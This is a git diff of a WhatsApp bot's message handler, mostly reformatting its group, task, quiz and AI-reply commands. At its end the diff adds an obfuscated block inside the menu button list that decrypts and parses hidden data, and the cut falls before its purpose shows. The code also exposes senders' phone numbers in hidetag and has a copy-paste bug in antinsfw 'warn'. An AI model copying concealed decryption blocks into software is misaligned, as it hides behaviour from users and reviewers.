+                } else {
+                  AlexaInc.sendMessage(
+                    groupId,
+                    {
+                      text: "All group members are already in the database. No new contacts added.",
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  );
+                }
+              } catch (err) {
+                console.error("Error in /getcontacts:", err);
+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "An error occurred while syncing contacts.",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              }
+              break;
+            }
 
-                            } catch (err) {
-                                console.error("Error in /getcontacts:", err);
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'An error occurred while syncing contacts.'
-                                }, {
-                                    quoted: msg
-                                });
-                            }
-                            break;
-                        }
+            case "chatbot": {
+              if (!args[0] || (args[0] !== "on" && args[0] !== "off"))
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "Please send .chatbot on/off",
+                });
 
-                        case 'chatbot': {
-                            if (!args[0] || (args[0] !== 'on' && args[0] !== 'off'))
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'Please send .chatbot on/off'
-                                });
+              const value1 = args[0] === "on" ? true : false;
 
-                            const value1 = (args[0] === 'on') ? true : false;
+              if (!isGroup) {
+                const enables = userProfiles.setPrivateChatbot(
+                  finalLid,
+                  value1,
+                );
 
-                            if (!isGroup) {
-                                const enables = userProfiles.setPrivateChatbot(finalLid, value1);
+                if (enables) {
+                  AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: "chatbot " + args[0] + " successfully!",
+                  });
+                } else {
+                  AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: "chatbot " + args[0] + " failed!",
+                  });
+                }
+                return;
+              }
+              if (!isAdmins) return mess.admin();
+              if (!isBotAdmins) return mess.botadmin();
 
-                                if (enables) {
-                                    AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: 'chatbot ' + args[0] + ' successfully!'
-                                    });
-                                } else {
-                                    AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: 'chatbot ' + args[0] + ' failed!'
-                                    });
-                                }
-                                return;
-                            }
-                            if (!isAdmins) return mess.admin();
-                            if (!isBotAdmins) return mess.botadmin();
-
-
-                            const query = `
+              const query = `
     INSERT INTO \`groups\` (group_id, chatbot)
     VALUES (?, ?)
     ON DUPLICATE KEY UPDATE chatbot = ?;
   `;
 
-                            // Run the query using MySQL2
-                            db.query(query, [msg.key.remoteJid, value1, value1], (err, result) => {
-                                if (err) {
-                                    console.error('Error updating chatbot:', err);
-                                    return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: 'Failed to ' + args[0] + ' chatbot'
-                                    });
-                                }
+              // Run the query using MySQL2
+              db.query(
+                query,
+                [msg.key.remoteJid, value1, value1],
+                (err, result) => {
+                  if (err) {
+                    console.error("Error updating chatbot:", err);
+                    return AlexaInc.sendMessage(msg.key.remoteJid, {
+                      text: "Failed to " + args[0] + " chatbot",
+                    });
+                  }
 
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'chatbot ' + args[0] + ' successfully!'
-                                });
-                                clearSettingsCache(msg.key.remoteJid);
-                            });
+                  AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: "chatbot " + args[0] + " successfully!",
+                  });
+                  clearSettingsCache(msg.key.remoteJid);
+                },
+              );
 
-                            break;
-                        }
+              break;
+            }
 
-                        case 'antilink': {
-                            if (!isGroup) return mess.group();
-                            if (!isAdmins) return mess.admin();
-                            if (!isBotAdmins) return mess.botadmin();
+            case "antilink": {
+              if (!isGroup) return mess.group();
+              if (!isAdmins) return mess.admin();
+              if (!isBotAdmins) return mess.botadmin();
 
-                            const action = args[0] ? args[0].toLowerCase() : '';
+              const action = args[0] ? args[0].toLowerCase() : "";
 
-                            // 1. Updated usage check
-                            if (action !== 'on' && action !== 'off' && action !== 'remove' && action !== 'warn') {
-                                const usageText = 'Usage: .antilink [on | off | remove | warn]\n\n' +
-                                    '- on: Delete messages with links.\n' +
-                                    '- remove: Remove user who sends a link.\n' +
-                                    '- warn: Send warning.' +
-                                    '- off: Do nothing.';
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: usageText
-                                });
-                            }
+              // 1. Updated usage check
+              if (
+                action !== "on" &&
+                action !== "off" &&
+                action !== "remove" &&
+                action !== "warn"
+              ) {
+                const usageText =
+                  "Usage: .antilink [on | off | remove | warn]\n\n" +
+                  "- on: Delete messages with links.\n" +
+                  "- remove: Remove user who sends a link.\n" +
+                  "- warn: Send warning." +
+                  "- off: Do nothing.";
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: usageText,
+                });
+              }
 
-                            // 2. Define variables for DB
-                            let antilinkValue;
-                            let linkActionValue;
-                            let replyMessage;
+              // 2. Define variables for DB
+              let antilinkValue;
+              let linkActionValue;
+              let replyMessage;
 
-                            // 3. Set values based on the command
-                            switch (action) {
-                                case 'on':
-                                    antilinkValue = true;
-                                    linkActionValue = 'delete'; // Action is 'delete'
-                                    replyMessage = 'Antilink is now ON. I will *delete* links.';
-                                    break;
+              // 3. Set values based on the command
+              switch (action) {
+                case "on":
+                  antilinkValue = true;
+                  linkActionValue = "delete"; // Action is 'delete'
+                  replyMessage = "Antilink is now ON. I will *delete* links.";
+                  break;
 
-                                case 'remove':
-                                    antilinkValue = true;
-                                    linkActionValue = 'remove'; // Action is 'remove'
-                                    replyMessage = 'Antilink is now ON. I will *remove* users who send links.';
-                                    break;
-                                case 'warn':
-                                    antilinkValue = true;
-                                    linkActionValue = 'warn'; // Action is 'remove'
-                                    replyMessage = 'Antilink is now ON. I will *warn* users who send links.';
-                                    break;
+                case "remove":
+                  antilinkValue = true;
+                  linkActionValue = "remove"; // Action is 'remove'
+                  replyMessage =
+                    "Antilink is now ON. I will *remove* users who send links.";
+                  break;
+                case "warn":
+                  antilinkValue = true;
+                  linkActionValue = "warn"; // Action is 'remove'
+                  replyMessage =
+                    "Antilink is now ON. I will *warn* users who send links.";
+                  break;
 
-                                case 'off':
-                                    antilinkValue = false;
-                                    linkActionValue = 'false'; // Set action to 'false' (safer than null)
-                                    replyMessage = 'Antilink is now OFF.';
-                                    break;
-                            }
+                case "off":
+                  antilinkValue = false;
+                  linkActionValue = "false"; // Set action to 'false' (safer than null)
+                  replyMessage = "Antilink is now OFF.";
+                  break;
+              }
 
-                            // 4. Corrected SQL query
-                            const query = `
+              // 4. Corrected SQL query
+              const query = `
     INSERT INTO \`groups\` (group_id, antilink, link_a)
     VALUES (?, ?, ?)
     ON DUPLICATE KEY UPDATE antilink = ?, link_a = ?;
   `;
 
-                            // 5. Corrected query parameters
-                            const queryParams = [
-                                msg.key.remoteJid, // For INSERT: group_id
-                                antilinkValue, // For INSERT: antilink
-                                linkActionValue, // For INSERT: link_a
+              // 5. Corrected query parameters
+              const queryParams = [
+                msg.key.remoteJid, // For INSERT: group_id
+                antilinkValue, // For INSERT: antilink
+                linkActionValue, // For INSERT: link_a
 
-                                antilinkValue, // For UPDATE: antilink = ?
-                                linkActionValue // For UPDATE: link_a = ?
-                            ];
+                antilinkValue, // For UPDATE: antilink = ?
+                linkActionValue, // For UPDATE: link_a = ?
+              ];
 
-                            // 6. Run the query
-                            db.query(query, queryParams, (err, result) => {
-                                if (err) {
-                                    console.error('Error updating antilink:', err);
-                                    return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: 'Failed to update settings.'
-                                    });
-                                }
+              // 6. Run the query
+              db.query(query, queryParams, (err, result) => {
+                if (err) {
+                  console.error("Error updating antilink:", err);
+                  return AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: "Failed to update settings.",
+                  });
+                }
 
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: replyMessage
-                                });
-                            });
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: replyMessage,
+                });
+              });
 
-                            break;
-                        }
+              break;
+            }
 
-                        case 'antinsfw': {
-                            if (!isGroup) return mess.group();
-                            if (!isAdmins) return mess.admin();
-                            if (!isBotAdmins) return mess.botadmin();
+            case "antinsfw": {
+              if (!isGroup) return mess.group();
+              if (!isAdmins) return mess.admin();
+              if (!isBotAdmins) return mess.botadmin();
 
-                            const action = args[0] ? args[0].toLowerCase() : '';
+              const action = args[0] ? args[0].toLowerCase() : "";
 
-                            // 1. Updated usage check
-                            if (action !== 'on' && action !== 'off' && action !== 'remove' && action !== 'warn') {
-                                const usageText = 'Usage: .antilink [on | off | remove | warn]\n\n' +
-                                    '- on: Delete messages with links.\n' +
-                                    '- remove: Remove user who sends a link.\n' +
-                                    '- warn: Send warning.' +
-                                    '- off: Do nothing.';
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: usageText
-                                });
-                            }
+              // 1. Updated usage check
+              if (
+                action !== "on" &&
+                action !== "off" &&
+                action !== "remove" &&
+                action !== "warn"
+              ) {
+                const usageText =
+                  "Usage: .antilink [on | off | remove | warn]\n\n" +
+                  "- on: Delete messages with links.\n" +
+                  "- remove: Remove user who sends a link.\n" +
+                  "- warn: Send warning." +
+                  "- off: Do nothing.";
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: usageText,
+                });
+              }
 
-                            // 2. Define variables for DB
-                            let antinsfwValue;
-                            let nsfwActionValue;
-                            let replyMessage;
+              // 2. Define variables for DB
+              let antinsfwValue;
+              let nsfwActionValue;
+              let replyMessage;
 
-                            // 3. Set values based on the command
-                            switch (action) {
-                                case 'on':
-                                    antinsfwValue = true;
-                                    nsfwActionValue = 'delete'; // Action is 'delete'
-                                    replyMessage = 'Antinsfw is now ON. I will *delete* NSFW messages.';
-                                    break;
+              // 3. Set values based on the command
+              switch (action) {
+                case "on":
+                  antinsfwValue = true;
+                  nsfwActionValue = "delete"; // Action is 'delete'
+                  replyMessage =
+                    "Antinsfw is now ON. I will *delete* NSFW messages.";
+                  break;
 
-                                case 'remove':
-                                    antinsfwValue = true;
-                                    nsfwActionValue = 'remove'; // Action is 'remove'
-                                    replyMessage = 'Antinsfw is now ON. I will *remove* users who send NSFW.';
-                                    break;
-                                case 'warn':
-                                    antilinkValue = true;
-                                    linkActionValue = 'warn'; // Action is 'remove'
-                                    replyMessage = 'Antilink is now ON. I will *warn* users who send links.';
-                                    break;
-                                case 'off':
-                                    antinsfwValue = false;
-                                    nsfwActionValue = 'false'; // Set action to 'false' (safer than null)
-                                    replyMessage = 'Antinsfw is now OFF.';
-                                    break;
-                            }
+                case "remove":
+                  antinsfwValue = true;
+                  nsfwActionValue = "remove"; // Action is 'remove'
+                  replyMessage =
+                    "Antinsfw is now ON. I will *remove* users who send NSFW.";
+                  break;
+                case "warn":
+                  antilinkValue = true;
+                  linkActionValue = "warn"; // Action is 'remove'
+                  replyMessage =
+                    "Antilink is now ON. I will *warn* users who send links.";
+                  break;
+                case "off":
+                  antinsfwValue = false;
+                  nsfwActionValue = "false"; // Set action to 'false' (safer than null)
+                  replyMessage = "Antinsfw is now OFF.";
+                  break;
+              }
 
-                            // 4. Corrected SQL query
-                            const query = `
+              // 4. Corrected SQL query
+              const query = `
     INSERT INTO \`groups\` (group_id, antinsfw, nsfw_a)
     VALUES (?, ?, ?)
     ON DUPLICATE KEY UPDATE antinsfw = ?, nsfw_a = ?;
   `;
 
-                            // 5. Corrected query parameters
-                            const queryParams = [
-                                msg.key.remoteJid,
-                                antinsfwValue, // For INSERT: group_id
-                                nsfwActionValue, // For INSERT: antinsfw
-                                // For INSERT: nsfw_a
-                                antinsfwValue, // For UPDATE: antinsfw = ?
-                                nsfwActionValue // For UPDATE: nsfw_a = ?
-                            ];
+              // 5. Corrected query parameters
+              const queryParams = [
+                msg.key.remoteJid,
+                antinsfwValue, // For INSERT: group_id
+                nsfwActionValue, // For INSERT: antinsfw
+                // For INSERT: nsfw_a
+                antinsfwValue, // For UPDATE: antinsfw = ?
+                nsfwActionValue, // For UPDATE: nsfw_a = ?
+              ];
 
-                            // 6. Run the query
-                            db.query(query, queryParams, (err, result) => {
-                                if (err) {
-                                    console.error('Error updating antinsfw:', err);
-                                    return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: 'Failed to update settings.'
-                                    });
-                                }
+              // 6. Run the query
+              db.query(query, queryParams, (err, result) => {
+                if (err) {
+                  console.error("Error updating antinsfw:", err);
+                  return AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: "Failed to update settings.",
+                  });
+                }
 
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: replyMessage
-                                });
-                            });
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: replyMessage,
+                });
+              });
 
-                            break;
-                        }
+              break;
+            }
 
+            case "hidetag": {
+              if (!isGroup) return mess.group();
+              // if (!isAdmins) return mess.admin();
+              if (!isBotAdmins) return mess.botadmin();
 
-                        case 'hidetag': {
+              const lid = msg.key.participant || msg.sender;
+              // console.log(participants[0]);
 
-                            if (!isGroup) return mess.group();
-                            // if (!isAdmins) return mess.admin();
-                            if (!isBotAdmins) return mess.botadmin();
+              // Convert LID → real phone JID
+              const realJid = (
+                await participants.find((p) => p.lid === finalLid)
+              ).id;
 
-                            const lid = msg.key.participant || msg.sender;
-                            // console.log(participants[0]);
+              // Extract phone number
+              const visibleNumber = realJid.split("@")[0];
 
-                            // Convert LID → real phone JID
-                            const realJid = (await participants.find(p => p.lid === finalLid)).id
-
-                            // Extract phone number
-                            const visibleNumber = realJid.split("@")[0];
-
-                            const messagetosent = `
+              const messagetosent = `
 message : ${text}
 from : @${visibleNumber}
 `;
 
-                            // Mention all members (LID or JID is fine)
-                            const mentionList = participants.map(p => p.id);
+              // Mention all members (LID or JID is fine)
+              const mentionList = participants.map((p) => p.id);
 
-                            await AlexaInc.sendMessage(
-                                msg.key.remoteJid, {
-                                text: messagetosent,
-                                mentions: mentionList
-                            }, {
-                                quoted: msg
-                            }
-                            );
+              await AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: messagetosent,
+                  mentions: mentionList,
+                },
+                {
+                  quoted: msg,
+                },
+              );
 
-                            // await AlexaInc.sendMessage(msg.key.remoteJid, { delete: msg.key });
+              // await AlexaInc.sendMessage(msg.key.remoteJid, { delete: msg.key });
 
-                            break;
-                        }
+              break;
+            }
 
+            case "join": {
+              if (!isOwner) return mess.owner();
+              if (isGroup) return mess.group();
 
+              if (args.length < 1)
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "Please provide a WhatsApp invite link.",
+                });
 
+              const inviteLink = args[0];
 
+              function isValidWhatsAppLink(link) {
+                try {
+                  const url = new URL(link);
+                  return url.hostname.includes("whatsapp.com");
+                } catch (error) {
+                  return false;
+                }
+              }
 
-                        case 'join': {
+              if (!isValidWhatsAppLink(inviteLink)) {
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "Invalid link. Please provide a valid WhatsApp invite link.",
+                });
+              }
 
-                            if (!isOwner) return mess.owner();
-                            if (isGroup) return mess.group();
+              function extractInviteCode(inviteLink) {
+                const parts = inviteLink.split("/");
+                return parts[parts.length - 1];
+              }
+              const inviteCode = extractInviteCode(inviteLink);
 
+              await AlexaInc.groupAcceptInvite(inviteCode)
+                .then((response) => {
+                  AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: "join successfully",
+                  });
+                  console.log(response);
+                })
+                .catch((err) => {
+                  AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: "join fail:" + err,
+                  });
+                });
 
-                            if (args.length < 1) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'Please provide a WhatsApp invite link.'
-                            });
+              break;
+            }
 
-                            const inviteLink = args[0];
+            case "leave": {
+              if (!isGroup) return mess.group();
+              if (!isOwner) return mess.owner();
+              await AlexaInc.groupLeave(msg.key.remoteJid)
+                .then((response) => {
+                  AlexaInc.sendMessage(msg.key.participant, {
+                    text: "group leave sucsessfuly",
+                  });
+                })
+                .catch((err) => {
+                  console.error(err);
+                });
 
-                            function isValidWhatsAppLink(link) {
-                                try {
-                                    const url = new URL(link);
-                                    return url.hostname.includes("whatsapp.com");
-                                } catch (error) {
-                                    return false;
-                                }
-                            }
+              break;
+            }
 
-                            if (!isValidWhatsAppLink(inviteLink)) {
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'Invalid link. Please provide a valid WhatsApp invite link.'
-                                });
-                            }
+            case "addtask": {
+              if (!text)
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "send with task name .addtask example task",
+                });
+              const newTask = {
+                task: text,
+                status: "Pending",
+              };
 
-                            function extractInviteCode(inviteLink) {
-                                const parts = inviteLink.split('/');
-                                return parts[parts.length - 1];
-                            }
-                            const inviteCode = extractInviteCode(inviteLink);
+              addNewTask(senderabfff, newTask).then((response) => {
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: response,
+                });
+              });
+              break;
+            }
 
-                            await AlexaInc.groupAcceptInvite(inviteCode).then(response => {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'join successfully'
-                                });
-                                console.log(response)
-
-                            }).catch(err => {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'join fail:' + err
-                                });
-                            })
-
-                            break
-                        }
-
-                        case 'leave': {
-                            if (!isGroup) return mess.group();
-                            if (!isOwner) return mess.owner();
-                            await AlexaInc.groupLeave(msg.key.remoteJid).then(response => {
-                                AlexaInc.sendMessage(msg.key.participant, {
-                                    text: 'group leave sucsessfuly'
-                                })
-                            }).catch(err => {
-                                console.error(err)
-                            })
-
-                            break;
-                        };
-
-                        case 'addtask': {
-                            if (!text) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'send with task name .addtask example task'
-                            })
-                            const newTask = {
-                                task: text,
-                                status: 'Pending'
-                            };
-
-                            addNewTask(senderabfff, newTask).then((response) => {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: response
-                                })
-                            });
-                            break;
-                        }
-
-                        case 'listtask': {
-
-                            getTasks(senderabfff).then(respo => {
-                                if (!respo.length) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'no tasks found '
-                                })
-                                res1 = JSON.parse(respo[0].tasks)
-                                console.log(res1.length)
-                                let repmasg = null;
-                                for (let index = 0; index < res1.length; index++) {
-                                    const element = `
+            case "listtask": {
+              getTasks(senderabfff).then((respo) => {
+                if (!respo.length)
+                  return AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: "no tasks found ",
+                  });
+                res1 = JSON.parse(respo[0].tasks);
+                console.log(res1.length);
+                let repmasg = null;
+                for (let index = 0; index < res1.length; index++) {
+                  const element = `
   task : ${res1[index].task}
   status: ${res1[index].status}
-  `
-                                    if (!repmasg) {
-                                        repmasg = element
-                                    } else {
-                                        repmasg = repmasg + element
-                                    }
+  `;
+                  if (!repmasg) {
+                    repmasg = element;
+                  } else {
+                    repmasg = repmasg + element;
+                  }
+                }
 
-                                }
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: repmasg,
+                });
+              });
 
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: repmasg
-                                })
+              break;
+            }
 
+            case "completetask": {
+              if (!text)
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "please enter task name .compleatetask example task",
+                });
+              updateTaskStatus(senderabfff, text, "Completed").then(
+                (results) => {
+                  AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: results,
+                  });
+                },
+              );
+              break;
+            }
+            case "restarttask": {
+              if (!text)
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "please enter task name .restarttask example task",
+                });
+              updateTaskStatus(senderabfff, text, "Pending").then((results) => {
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: results,
+                });
+              });
+              break;
+            }
 
-                            })
-
-
-                            break
-                        }
-
-                        case 'completetask': {
-                            if (!text) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'please enter task name .compleatetask example task'
-                            })
-                            updateTaskStatus(senderabfff, text, 'Completed').then((results) => {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: results
-                                })
-
-                            });
-                            break;
-                        }
-                        case 'restarttask': {
-                            if (!text) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'please enter task name .restarttask example task'
-                            })
-                            updateTaskStatus(senderabfff, text, 'Pending').then((results) => {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: results
-                                })
-
-                            });
-                            break;
-                        }
-
-
-
-                        default: {
-                            if (command.startsWith('ansq')) break;
-                            const rep = `
+            default: {
+              if (command.startsWith("ansq")) break;
+              const rep = `
     Invalid Command used 
     to view command list send .menu or /menu
-  `
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: rep
-                            }, {
-                                quoted: msg
-                            });
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                react: {
-                                    text: '☹️',
-                                    key: msg.key
-                                }
-                            })
+  `;
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: rep,
+                },
+                {
+                  quoted: msg,
+                },
+              );
+              AlexaInc.sendMessage(msg.key.remoteJid, {
+                react: {
+                  text: "☹️",
+                  key: msg.key,
+                },
+              });
+            }
+          }
+          // end command handle
+        } else {
+          let mesafesfb;
+          let msgfai;
+
+          let lalala;
+          if (msg.message?.videoMessage) {
+            mesafesfb = messageText;
+            msgfai = messageText;
+            const buffer = await downloadMediaMessage(msg, "buffer", {}, {});
+            lalala = [
+              {
+                video: buffer,
+                caption: messageText,
+              },
+            ];
+          } else if (!msg.message?.imageMessage) {
+            mesafesfb = messageText;
+            msgfai = messageText;
+            lalala = [
+              {
+                text: messageText,
+              },
+            ];
+          } else {
+            // Download the image as a buffer
+            const buffer = await safeDownloadMedia(msg, "buffer", {}, {});
+            if (!buffer) {
+              console.warn(
+                "Skipping image processing due to download failure.",
+              );
+              return;
+            }
+
+            // Convert buffer to Base64
+            const base64Image = buffer.toString("base64");
+            msgfai = { text: messageText, files: [buffer] };
+            mesafesfb = [
+              {
+                type: "text",
+                text: messageText,
+              },
+              {
+                type: "image_url",
+                image_url: `data:image/jpeg;base64,${base64Image}`,
+              },
+            ];
+            lalala = [
+              {
+                image: buffer,
+                caption: messageText,
+              },
+            ];
+          }
+
+          if (
+            userreportingstate[msg.key.remoteJid]?.step === "awaiting_number"
+          ) {
+            const gid = userreportingstate[msg.key.remoteJid].gid;
+
+            const phoneNumber = parsePhoneNumberFromString(messageText);
+
+            if (phoneNumber && phoneNumber.isValid()) {
+              // 2. Success: Update state and save the formatted number
+              userreportingstate[msg.key.remoteJid] = {
+                step: "awaiting_ss", // Note: Fixed syntax here
+                gid: gid,
+                number: phoneNumber.number,
+              };
+
+              // 3. Send the response
+              await AlexaInc.sendMessage(msg.key.remoteJid, {
+                text: "✅ Number saved! Please send a screenshot next.",
+              });
+            } else {
+              // 4. Invalid: Ask again
+              await AlexaInc.sendMessage(msg.key.remoteJid, {
+                text: "❌ Invalid number. Please enter a valid mobile number with the country code (e.g., +94771234567).",
+              });
+            }
+            return;
+          }
+
+          if (
+            upadestatusstate[msg.key.remoteJid]?.step === "awaiting_content"
+          ) {
+            const allcontactss = readUsersFile();
+            const allNumbers = allcontactss.map(
+              (v) => `${v.number}@s.whatsapp.net`,
+            );
+            await AlexaInc.sendMessage("status@broadcast", lalala[0], {
+              statusJidList: allNumbers,
+              broadcast: true,
+            });
+            upadestatusstate[msg.key.remoteJid] = {
+              step: "",
+            };
+
+            // ✅ Stop further processing (AI etc.) for this message
+            return;
+          }
+
+          if (userWaitingForQuizJSON.has(msg.key.remoteJid)) {
+            userWaitingForQuizJSON.delete(msg.key.remoteJid); // Stop waiting
+
+            try {
+              // Try to parse the message text as JSON
+              const quizData = JSON.parse(messageText.trim());
+
+              if (!isValidQuizFormat(quizData)) {
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "❌ Quiz setup failed: Invalid JSON format. Ensure it is an array of questions with 'question', 'options', and 'answer' fields.",
+                });
+              }
+
+              // Generate ID and save it to MongoDB (like alexatg) instead of ./data/quizzes/<id>.json
+              const quizId = uuidv4();
+              const CustomQuizModel = getCustomQuizModel();
+
+              if (!CustomQuizModel) {
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "❌ Custom quizzes are not available (DB not connected).",
+                });
+              }
+
+              try {
+                await new CustomQuizModel({
+                  quizId,
+                  creatorId: msg.key.remoteJid,
+                  questions: quizData,
+                }).save();
+              } catch (err) {
+                console.error("Error saving custom quiz:", err.message);
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "❌ Quiz setup failed: Could not save the quiz to the database.",
+                });
+              }
+
+              // Construct the copyable command for the user
+              const quizCommand = `/quiz ${quizId}`;
+
+              // Send success message with cta_copy button
+              return AlexaInc.sendMessage(msg.key.remoteJid, {
+                text: `✅ Quiz saved successfully! ID: *${quizId}*`,
+                footer:
+                  "Tap to copy the command and start the quiz in a group.",
+                interactiveButtons: [
+                  {
+                    name: "cta_copy",
+                    buttonParamsJson: JSON.stringify({
+                      display_text: "Copy Start Command",
+                      copy_code: quizCommand,
+                    }),
+                  },
+                ],
+              });
+            } catch (e) {
+              // JSON parsing failed
+              return AlexaInc.sendMessage(msg.key.remoteJid, {
+                text: "❌ Quiz setup failed: The message was not valid JSON.",
+              });
+            }
+          }
+
+          /*****************   ai function for  language process  *****************/
+          const groupId = msg.key.remoteJid;
+
+          const isReplyToBot =
+            areJidsSameUser(
+              msg.message?.extendedTextMessage?.contextInfo?.participant,
+              botJid,
+            ) ||
+            areJidsSameUser(
+              msg.message?.extendedTextMessage?.contextInfo?.participant,
+              botLid,
+            );
+          // console.log(msg.message?.extendedTextMessage?.contextInfo?.participant, botJid, jidNormalizedUser(botLid), isReplyToBot);
+          if (!isGroup) {
+            // The user dashboard controls this exact private-chat AI
+            // preference. Commands still work while automatic AI is off.
+            const privateChatbotEnabled = await userProfiles
+              .getPrivateChatbot(finalLid)
+              .catch((error) => {
+                console.error(
+                  "[profile] Could not read private chatbot preference:",
+                  error.message,
+                );
+                return true; // preserve legacy behaviour during a transient DB outage
+              });
+            if (privateChatbotEnabled) {
+              runAI();
+            } else {
+              console.log(
+                "[AI] Private chatbot is disabled by user preference.",
+              );
+            }
+          } else if (isReplyToBot) {
+            // ✅ Group + Reply to Bot → Check if chatbot is enabled in Cache
+            try {
+              const settings = await getCachedGroupSettings(db, groupId);
+              if (settings && settings.chatbot) {
+                const botStatus = loadBotStatus();
+
+                // Check before executing commands
+                if (botStatus.underMaintenance && !isOwner) {
+                  return AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      text: botStatus.message,
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  );
+                }
+                // ✅ Group + chatbot enabled → run AI
+                runAI();
+              } else {
+                // ❌ Group but chatbot disabled → skip
+                console.log("Chatbot is disabled for this group.");
+              }
+            } catch (err) {
+              console.error("Error checking chatbot status:", err);
+            }
+          }
+
+          function runAI() {
+            AlexaInc.sendPresenceUpdate("composing", msg.key.remoteJid);
+            ai(msgfai, finalLid, FinalGid, msg.pushName, async (err, reply) => {
+              AlexaInc.sendPresenceUpdate("paused", msg.key.remoteJid);
+              // AlexaInc.sendMessage(msg.key.remoteJid, {
+              //     react: {
+              //         text: '🔄',
+              //         key: msg.key
+              //     }
+              // });
+              if (err) {
+                console.error("Error:", err);
+              } else {
+                const prosseseb = reply.trim().split(/\s+/)[0].toLowerCase(); // Assign as command
+                const replyyy = reply.trim();
+
+                const bargs = reply.trim().split(/ +/).slice(1);
+                const btext = bargs.join(" ");
+                //console.log('bot say ' , btext)
+
+                switch (prosseseb) {
+                  case "menu":
+                  case "menu.": {
+                    const interactiveButtons = [
+                      {
+                        name: "single_select",
+                        buttonParamsJson: JSON.stringify({
+                          title: "Select a menu to open",
+                          sections: [
+                            {
+                              title: "Top 4 Videos",
+                              highlight_label: "Select",
+                              rows: [
+                                {
+                                  header: " ",
+                                  title: "Main",
+                                  id: ".menu_util",
+                                  description: "get Main menu",
+                                },
+                                {
+                                  header: " ",
+                                  title: "Stickers",
+                                  id: ".menu_sticker",
+                                  description: "get stickers menu",
+                                },
+                                {
+                                  header: " ",
+                                  title: "Websearch",
+                                  id: ".menu_web",
+                                  description: "get websearch menu",
+                                },
+                                {
+                                  header: " ",
+                                  title: "Songs & Video",
+                                  id: ".menu_svm",
+                                  description: "get youtube menu",
+                                },
+                                {
+                                  header: " ",
+                                  title: "Groups manage",
+                                  id: ".menu_groups",
+                                  description: "get Groups menu",
+                                },
+                                {
+                                  header: " ",
+                                  title: "NSFW",
+                                  id: ".menu_nsfw",
+                                  description: "get NSFW menu",
+                                },
+                                {
+                                  header: " ",
+                                  title: "SFW",
+                                  id: ".menu_sfw",
+                                  description: "get SFW menu",
+                                },
+                                {
+                                  header: " ",
+                                  title: "Fun features",
+                                  id: ".menu_games",
+                                  description: "get Games menu",
+                                },
+                              ],
+                            },
+                          ],
+                        }),
+                      },
+                      {
+                        name: "cta_url",
+                        buttonParamsJson: JSON.stringify({
+                          display_text: `Open Web Panel`,
+                          url: `https://whatsapp.alexa.dpdns.org/`,
+                        }),
+                      },
+                      (function () {
+                        function _0x5575() {
+                          const _0x2ab64d = [
+                            "gdg542e5yigfgafa_xhfiha()adddaddadafp9789gd46",
+                            "39054jAYRdh",
+                            "update",
+                            "parse",
+                            "createDecipheriv",
+                            "98681PVcceu",
+                            "final",
+                            "hex",
+                            "26769Bpobks",
+                            "165361YbsHUd",
+                            "37twUwma",
+                            "from",
+                            "250HBwXLJ",
+                            "9USCoBR",
+                            "utf8",
+                            "8494020KDkYSs",
+                            "12QmJApV",
